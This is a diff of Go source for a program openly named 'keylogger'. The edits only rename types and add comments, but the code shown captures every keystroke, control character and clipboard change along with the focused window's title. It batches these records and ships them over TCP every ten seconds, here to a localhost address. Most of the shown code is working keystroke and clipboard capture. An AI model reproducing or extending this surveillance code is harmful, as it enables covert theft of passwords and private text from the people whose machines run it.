@@ -32,7 +32,7 @@ const (
 	Protocol = "tcp"
 	Address  = "127.0.0.1:8722"
 
-	AppName = "Keylogger"
+	AppName = "keylogger"
 
 	TypeKeyboard  KeyType = "KYBD"
 	TypeClipboard KeyType = "CPBD"
@@ -41,51 +41,52 @@ const (
 	Interval = 10 * time.Second
 )
 
+// ControlCharacters are invisible ASCII characters from 0 to 31 and 127.
 var ControlCharacters = map[rune]string{
-	rune(0):   "NULL", // Null character
-	rune(1):   "SOH",  // Start of header
-	rune(2):   "STX",  // Start of text
-	rune(3):   "ETX",  // End of text
-	rune(4):   "EOT",  // End of transmission
-	rune(5):   "ENQ",  // Enquiry
-	rune(6):   "ACK",  // Acknowledgement
-	rune(7):   "BEL",  // Bell
-	rune(8):   "BS",   // Backspace
-	rune(9):   "HT",   // Horizontal tab
-	rune(10):  "LF",   // Line feed
-	rune(11):  "VT",   // Vertical tab
-	rune(12):  "FF",   // Form feed
-	rune(13):  "CR",   // Carriage return
-	rune(14):  "SO",   // Shift out
-	rune(15):  "SI",   // Shift in
-	rune(16):  "DLE",  // Data link escape
-	rune(17):  "DC1",  // Device control 1
-	rune(18):  "DC2",  // Device control 2
-	rune(19):  "DC3",  // Device control 3
-	rune(20):  "DC4",  // Device control 4
-	rune(21):  "NAK",  // Negative acknowledgement
-	rune(22):  "SYN",  // Synchronous idle
-	rune(23):  "ETB",  // End of transmission block
-	rune(24):  "CAN",  // Cancel
-	rune(25):  "EM",   // End of medium
-	rune(26):  "SUB",  // Substitute
-	rune(27):  "ESC",  // Escape
-	rune(28):  "FS",   // File separator
-	rune(29):  "GS",   // Group separator
-	rune(30):  "RS",   // Record separator
-	rune(31):  "US",   // Unit separator
-	rune(127): "DEL",  // Delete
+	0:   "NULL", // Null character
+	1:   "SOH",  // Start of header
+	2:   "STX",  // Start of text
+	3:   "ETX",  // End of text
+	4:   "EOT",  // End of transmission
+	5:   "ENQ",  // Enquiry
+	6:   "ACK",  // Acknowledgement
+	7:   "BEL",  // Bell
+	8:   "BS",   // Backspace
+	9:   "HT",   // Horizontal tab
+	10:  "LF",   // Line feed
+	11:  "VT",   // Vertical tab
+	12:  "FF",   // Form feed
+	13:  "CR",   // Carriage return
+	14:  "SO",   // Shift out
+	15:  "SI",   // Shift in
+	16:  "DLE",  // Data link escape
+	17:  "DC1",  // Device control 1
+	18:  "DC2",  // Device control 2
+	19:  "DC3",  // Device control 3
+	20:  "DC4",  // Device control 4
+	21:  "NAK",  // Negative acknowledgement
+	22:  "SYN",  // Synchronous idle
+	23:  "ETB",  // End of transmission block
+	24:  "CAN",  // Cancel
+	25:  "EM",   // End of medium
+	26:  "SUB",  // Substitute
+	27:  "ESC",  // Escape
+	28:  "FS",   // File separator
+	29:  "GS",   // Group separator
+	30:  "RS",   // Record separator
+	31:  "US",   // Unit separator
+	127: "DEL",  // Delete
 }
 
-type keyLog struct {
+type KeyLog struct {
 	Time  int64   `json:"time"`
 	Type  KeyType `json:"type"`
 	Title string  `json:"title"`
 	Value string  `json:"value"`
 }
 
-func newKeyLog(keyType KeyType, title string, value string) keyLog {
-	return keyLog{
+func NewKeyLog(keyType KeyType, title string, value string) KeyLog {
+	return KeyLog{
 		Time:  time.Now().UnixMilli(),
 		Type:  keyType,
 		Title: title,
@@ -93,7 +94,7 @@ func newKeyLog(keyType KeyType, title string, value string) keyLog {
 	}
 }
 
-var keyLogs []keyLog
+var keyLogs []KeyLog
 var ticker = time.NewTicker(Interval)
 
 func main() {
@@ -128,7 +129,7 @@ func listenClipboard() {
 		// If the clipboard is nonempty string or has been changed, log it and reset ticker.
 		if t != text && t != "" {
 			text = t
-			keyLogs = append(keyLogs, newKeyLog(TypeClipboard, getTitle(), text))
+			keyLogs = append(keyLogs, NewKeyLog(TypeClipboard, getTitle(), text))
 			ticker.Reset(Interval)
 		}
 	}
@@ -151,22 +152,22 @@ func listenKeyboard() {
 			}
 			// Handle control characters (ASCII from 0 to 31 and 127)
 			if ev.Keychar < 32 || ev.Keychar == 127 {
-				keyLogs = append(keyLogs, newKeyLog(TypeControl, title, ControlCharacters[ev.Keychar]))
+				keyLogs = append(keyLogs, NewKeyLog(TypeControl, title, ControlCharacters[ev.Keychar]))
 			} else {
 				// When nothing logged or the last recorded character is not TypeKeyboard, append a new logKey object
 				// directly. If it has recorded and the last recorded type is also TypeKeyboard, append the character to
 				// the Value field of the last object.
 				if len(keyLogs) == 0 {
-					keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
+					keyLogs = append(keyLogs, NewKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
 				} else {
 					if keyLogs[len(keyLogs)-1].Type == TypeKeyboard {
 						if keyLogs[len(keyLogs)-1].Title == title {
 							keyLogs[len(keyLogs)-1].Value += fmt.Sprintf("%c", ev.Keychar)
 						} else {
-							keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
+							keyLogs = append(keyLogs, NewKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
 						}
 					} else {
-						keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
+						keyLogs = append(keyLogs, NewKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
 					}
 				}
 			}
@@ -176,8 +177,10 @@ func listenKeyboard() {
 }
 
 // getTitle gets the currently focused application title and convert to UTF-8 texts according to its original charset.
+// So far, it can only handle UTF-8 and GB18030 (superset of GBK) strings correctly.
 func getTitle() string {
 	titleBytes := []byte(robotgo.GetTitle())
+	// Check charset and transform to UTF-8.
 	if utf8.Valid(titleBytes) {
 		return string(titleBytes)
 	} else {
@@ -219,5 +222,5 @@ func sendLogs() {
 		fmt.Println(err.Error())
 	}
 	// Clear the keyLog slice.
-	keyLogs = []keyLog{}
+	keyLogs = []KeyLog{}
 }
